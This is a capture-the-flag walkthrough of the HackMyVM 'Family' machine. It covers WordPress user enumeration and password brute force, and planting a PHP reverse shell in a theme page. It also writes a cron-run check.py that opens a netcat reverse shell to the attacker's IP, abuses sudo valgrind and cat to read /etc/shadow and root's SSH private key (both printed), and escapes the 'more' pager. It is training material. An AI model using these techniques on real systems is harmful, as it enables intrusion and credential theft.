![image](https://user-images.githubusercontent.com/76552238/159262998-d4ce2773-8e9e-40c0-a2e2-5e14f4f873b1.png)

***Target: 10.0.0.39***  
***Difficulty: Medium***  
***Source: https://hackmyvm.eu/machines/machine.php?vm=Family***  

## ***NMAP*** 

    $ nmap -sS -A -T4 -p- 10.0.0.39

    PORT   STATE SERVICE VERSION                                                                              
    22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u2 (protocol 2.0)                                       
    | ssh-hostkey:                                                                                            
    |   2048 0d:4e:fd:57:05:8f:d0:d6:1d:67:5d:6d:4e:b5:c9:fc (RSA)                                            
    |   256 d4:98:fb:a7:94:bd:0c:c6:a8:60:5b:bc:b9:c7:f4:51 (ECDSA)                                           
    |_  256 fa:34:3a:25:74:40:99:fc:4f:60:be:db:7e:7f:93:be (ED25519)                                         
    80/tcp open  http    Apache httpd 2.4.38                                                                  
    |_http-title: Index of /                                                                                  
    | http-ls: Volume /
    | SIZE  TIME              FILENAME
    | -     2020-02-06 07:33  wordpress/
    |_
    |_http-server-header: Apache/2.4.38 (Debian)

Firing up NMAP we see 2 open ports, 22 and 80. Even before we enumerate HTTP we can see that it is running wordpress based on the NMAP scan.

## ***HTTP***

    $ wpscan --url http://10.0.0.39/wordpress/ -e u,p,t

![image](https://user-images.githubusercontent.com/76552238/159282786-accc226a-4ede-4621-8721-9eae5906b78c.png)

The scan found the username 'admin', we can now brute force the login.

    $ wpscan -U 'admin' -P /usr/share/wordlists/rockyou.txt --url http://10.0.0.39/wordpress

And we found the password!

![image](https://user-images.githubusercontent.com/76552238/159283427-cf2e12b5-a22f-45ac-98c6-cff644bd2728.png)

Going to ***http://10.0.0.39/wordpress/wp-admin*** we are redirected to ***http://family/wordpress/wp-login.php?redirect_to=http%3A%2F%2F10.0.0.39%2Fwordpress%2Fwp-admin%2F&reauth=1***

This means the host name for the web server is 'family', let's add it to our /etc/hosts file.

    $ echo '10.0.0.39 family' >> /etc/hosts

![image](https://user-images.githubusercontent.com/76552238/159285068-9d3889ca-f76d-47c0-a6a6-49c57e075126.png)

![image](https://user-images.githubusercontent.com/76552238/159285181-e1fb561a-fec6-4cb0-8336-29ccf8c3fff8.png)

After login in we can upload a php reverse shell and connect to the machine.
We can edit the 'search.php' search page. Copying the script from ***https://github.com/pentestmonkey/php-reverse-shell/blob/master/php-reverse-shell.php*** and coping it to the page, we are able to get a reverse shell.

![image](https://user-images.githubusercontent.com/76552238/159285681-50d5a715-bece-4731-a19c-41e8d27ac72e.png)

    Remote Machine:

![image](https://user-images.githubusercontent.com/76552238/159286832-b9580a90-8d5b-45e2-8454-17c0c42978e9.png)

>

    Local Machine:
    $ nc -lvp 4444

![image](https://user-images.githubusercontent.com/76552238/159286946-bf654c46-969a-4eeb-a7a7-ac99d3d43a40.png)

## ***PRIVILEGE ESCALATION***

Going to the "home" folder we see 3 users.

![image](https://user-images.githubusercontent.com/76552238/159287427-e794be92-6411-4375-975b-6753f3b72735.png)

I tried to find SUID files to exploit but found nothing. I searched for running cron tabs using 'pspy64s' from ***https://github.com/DominicBreuker/pspy***.

After downloading it and running it on our local machine, I saw an interesting process being run.

![image](https://user-images.githubusercontent.com/76552238/159288380-3571c7a0-c66f-43e7-ad21-1311066fe024.png)

'***check.py***' is running by the user 'mother' every minute, we currently don't have access to go to the directory 'mother' as the user 'www-data'. Let's try getting a higher level user.

    $ find / -type f -user father 2> /dev/null
    /usr/share/perl/5.28.1/perso.txt
    $ find / -type f -user baby 2> /dev/null
    0

I searched for files owned by the users 'baby' and 'father' and found this file ***/usr/share/perl/5.28.1/perso.txt***.

### ***/usr/share/perl/5.28.1/perso.txt:***

![image](https://user-images.githubusercontent.com/76552238/159289384-99db2061-da40-4afd-b72a-8d3df5428bdb.png)

My guess this is the password for the user 'father'.  
We found the password for the user "father". After logging in we can now see what is inside the directory "father".  

![image](https://user-images.githubusercontent.com/76552238/159289556-69240805-4db9-4858-b67f-2d06ca16eb22.png)

Unfortunately there was no useful information, but we do have access to the directory 'mother' where the 'check.py' script that is running by the crontab should be at.
 
![image](https://user-images.githubusercontent.com/76552238/159289735-e71baeeb-9bd7-4903-a263-8362cb1a3106.png)

Doesn't seem there like there is any script here, so we can make one of our own. I found this tool on github named rsg (***https://github.com/mthbernardes/rsg***) that generates a python reverse shell script we could upload to the remote machine.
 
    Remote Machine:

    $ echo 'import os
    os.system("nc -e /bin/bash 10.0.0.27 5555")' > check.py

>

    Local Machine:

    $ nc -lvp 5555

![image](https://user-images.githubusercontent.com/76552238/159298768-9bed362e-55bd-4f79-bab3-d94201e38992.png)

    $ sudo -l

    Matching Defaults entries for mother on family:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User mother may run the following commands on family:
        (baby) NOPASSWD: /usr/bin/valgrind

The user 'mother' can run the command ***/usr/bin/valgrind*** as root without a password but only as the "baby" user. The command 'valgrind' is a debugging and profiling tool, we can open a new shell with the command like so '/usr/bin/valgrind /bin/bash'. 

    $ sudo -u baby /usr/bin/valgrind /bin/bash

![image](https://user-images.githubusercontent.com/76552238/159299038-7623bd05-c832-4a7f-859f-e8c2ecd2d2c0.png)

Going to the directory ***/home/baby*** there is a text file.

### ***/home/baby/user.txt:***
    Chilatyfile

We got the first flag. Now we need to get root and the final flag.

    $ sudo -l

    Matching Defaults entries for baby on family:
        env_reset, mail_badpass,
        secure_path=/usr/local/sbin\:/usr/local/bin\:/usr/sbin\:/usr/bin\:/sbin\:/bin

    User baby may run the following commands on family:
        (ALL : ALL) NOPASSWD: /usr/bin/cat

We can run the command 'cat' as root, this means we can read files with root permissions like the /etc/shadow file and crack the password for the 'root' and 'baby' users.

    $ sudo cat /etc/shadow

    root:$6$L9G0N6PxOApm2r4H$USfkGDLggFm.5W9nF5V54J0Zi5hXCcMofITfEXf7QyxIUWnNX2l1bpxpXIYo20JY5968YsklB9k8x1e6RuND/0:18742:0:99999:7:::
    daemon:*:18739:0:99999:7:::
    bin:*:18739:0:99999:7:::
    sys:*:18739:0:99999:7:::
    sync:*:18739:0:99999:7:::
    games:*:18739:0:99999:7:::
    man:*:18739:0:99999:7:::
    lp:*:18739:0:99999:7:::
    mail:*:18739:0:99999:7:::
    news:*:18739:0:99999:7:::
    uucp:*:18739:0:99999:7:::
    proxy:*:18739:0:99999:7:::
    www-data:*:18739:0:99999:7:::
    backup:*:18739:0:99999:7:::
    list:*:18739:0:99999:7:::
    irc:*:18739:0:99999:7:::
    gnats:*:18739:0:99999:7:::
    nobody:*:18739:0:99999:7:::
    _apt:*:18739:0:99999:7:::
    systemd-timesync:*:18739:0:99999:7:::
    systemd-network:*:18739:0:99999:7:::
    systemd-resolve:*:18739:0:99999:7:::
    messagebus:*:18739:0:99999:7:::
    sshd:*:18739:0:99999:7:::
    father:$6$2TAwmSS9bpvdGavh$8wMeBxMwKSqQR06kDk9HoATGLgUOwtQxOkWTbCFNKVOlM3rGWptuBffrW0FIwmSHASyeIxO5GEKGJsjEEdyoH0:18742:0:99999:7:::
    systemd-coredump:!!:18739::::::
    mysql:!:18739:0:99999:7:::
    mother:$6$sMtcQZxh/tLH6Fmr$bcRdJuYsezosKCFCCGrzX0Oz25Wh4fx3QCOT3bpCTadNFLpDcgMnQRYAZdKQ4uP4jW/fTkoBgIqJSWsLjeJs2.:18742:0:99999:7:::
    baby:$6$rlIgk/Phk.yVFB7M$6HwyFb1Zdc.1U4AsleVCMMuBjAul2.E8iEnow7PS0YMPCj/1.bAOcrqOWcB.Rr8TenvucGd/uhcXQKpRJfgLR1:18742:0:99999:7:::

Unfortunately we can't crack the passwords for the users, but we can do is read files on the root directory because we can run the command 'cat' as root.

Let's see if the '.ssh' directory is in the /root folder.

    $ sudo cat /root/.ssh

![image](https://user-images.githubusercontent.com/76552238/159300931-eb69d026-08bd-4987-b475-40b45ecca2dc.png)

Let's see if the 'authorized_keys' file is there.

    $ sudo cat /root/.ssh/authorized_keys
    command="bash ~/troll.sh" ssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABAQCdu5YWqC4vVGDE8XaQ7UW/WkLgEgWPE6n4BNfeTha+4nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE72/04Bxebvoz/TCYbj2/6cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf25WIGpPc1lA2ubNXxXnfh9mwZ4ewx++91tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFypov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfeMFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGv root@family

    $ sudo cat /root/.ssh/id_rsa
    -----BEGIN OPENSSH PRIVATE KEY-----
    b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABFwAAAAdzc2gtcn
    NhAAAAAwEAAQAAAQEAnbuWFqguL1RgxPF2kO1Fv1pC4BIFjxOp+ATX3k4WvuJyEdrcAFB5
    esn89B6TTKjBffemI/Ppb6/KQ+RXjgh5ZtEzxmRHhO9v9OAcXm76M/0wmG49v+nD79y53b
    KFMjcsqwvHZXjn4b3Wk1myQTC2sP763UNfBfd5ZH9uViBqT3NZQNrmzV8V534fZsGeHsMf
    vvdbU5yRWlQIHypurKs5jKtwXnRJqpTnDkics2SBcqaL+1ivwZIyNlBvdS7YZBoxRasLG5
    3UKg4SIc9K3ujdYtCDYYSGjRxHQLIDRx1wGDo4Bn3jBbZsHqT6A3mpx367jx08WHlcy+eb
    hGyuXtnBrwAAA8CBizlZgYs5WQAAAAdzc2gtcnNhAAABAQCdu5YWqC4vVGDE8XaQ7UW/Wk
    LgEgWPE6n4BNfeTha+4nIR2twAUHl6yfz0HpNMqMF996Yj8+lvr8pD5FeOCHlm0TPGZEeE
    72/04Bxebvoz/TCYbj2/6cPv3LndsoUyNyyrC8dleOfhvdaTWbJBMLaw/vrdQ18F93lkf2
    5WIGpPc1lA2ubNXxXnfh9mwZ4ewx++91tTnJFaVAgfKm6sqzmMq3BedEmqlOcOSJyzZIFy
    pov7WK/BkjI2UG91LthkGjFFqwsbndQqDhIhz0re6N1i0INhhIaNHEdAsgNHHXAYOjgGfe
    MFtmwepPoDeanHfruPHTxYeVzL55uEbK5e2cGvAAAAAwEAAQAAAQBKCYUXuXWETczmZJjM
    yjLU8N83If5t/ELp4gwZkvnmO5BjhSGDHEMJOcp8I+XsM8IvCJF5isHl5NPCLmpShvPFKS
    luVB+l7GXWwWNPiDP1N0EaK5TcgjOwYSD1SRhwS6mx1+OOY8QkF+GiZJXhN6ZpSiYiub7e
    pBzc6Vu3HZwJElUCvAuCxDbazc+RUT9VzH2BdQ3w1D66T8c3ruuRD8P86s0zf7/Bo/OmBi
    YeT/X3QcjyZTgmPjBR/m7nZNVUaDgWMCzIx2OecXX2bhdIVnpgVZVSq+EpidgvOPa/bjfQ
    AXB5vEuQ7lGz15Hx2isz5ai/zAKIGY33omnDT3f4ESvRAAAAgCkSIIvDtArb/6jXQb57In
    aExbm6PurE05TEHj/COnGSjD0iWk6CFFs33ud1A4FX1ACEVkEh51KBukSGhOXHd/nAH56i
    pL4h5vmyt3JqLlilSkRju2oOH1I5edxIbTHD5aFHssD3l2OSaO4ax/h42BVp+Xr63FdDbS
    NV8qd9gYp7AAAAgQDM02e+O6t1J+X41VaGRuJTnYCfWXKA5KnmmDM5UKQHm4i0dXL9xWgE
    bBrFggoE2XsowMLRGOPe0ijuXOkgkpCeSB/rxmQ+Nn2x2O/H7yoIgl1IbpNIK6EZTaCebC
    lfdn0hK55BSl394ql0y4ns91E4XL0Xvc9RDlBvGF5BAd/KwwAAAIEAxSQf51F5oIYIvl4l
    9y3g77L+VlV0Yg9iLunUT/km9abp9e2oTsNXN3e9IHja5GVxOUjhlBC8Yposlv/oaAApJu
    KC9XLqjqEmpo5gq61fG0HRPOkt1DKNuR3zIrWHot0DificHPyGISeu1/oR8tr9OR6Hmlvh
    +AY4rKYqqUj+hqUAAAALcm9vdEBmYW1pbHk=
    -----END OPENSSH PRIVATE KEY-----

After reading the 'authorized_keys' file and the private key, let's try to log in via to the machine via SSH as the 'root' user.

    $ ssh root@10.0.0.39 -i id_rsa


![image](https://user-images.githubusercontent.com/76552238/159302424-984fe0d8-57e9-494d-b48d-9781fa51172b.png) 

Reading the '***/home/root/.ssh/authorized_keys***' file again we see that the command '***/root/troll.sh***' is being executed once checking the hosts.

    $ sudo cat /root/troll.sh
    #!/bin/sh
    export TERM=xterm
    more /root/welcome.txt
    exit 0

Reading the '***troll.sh***' command we see the it reads a text file using the command '***more***' and then exits.

The '***more***' command is different from '***cat***' by that it displays one screen at a time in case the file is large. The '***more***' command also allows the user do scroll up and down through the page and even execute commands.  
That means if we can make the '***more***' command think the file it is trying to read is too large we can execute a command.  
All we need to is resize the window so no all of the file will be able to be displayed on the screen.

![image](https://user-images.githubusercontent.com/76552238/159303047-673daa9c-4217-40d3-9722-6b701b447827.png)

![image](https://user-images.githubusercontent.com/76552238/159303122-b4b620d5-9188-489b-b0bc-ae443fa84fe3.png)

![image](https://user-images.githubusercontent.com/76552238/159303179-42182d38-dc6f-4e85-9aaa-fc1bb5301ab3.png)

That was awesome!!!   
We can now read the final flag and finish the CTF.

### ***/root/last_flag.txt:***  

![image](https://user-images.githubusercontent.com/76552238/159303299-b6eef77c-04a0-4271-9030-fa45ec748811.png)
 
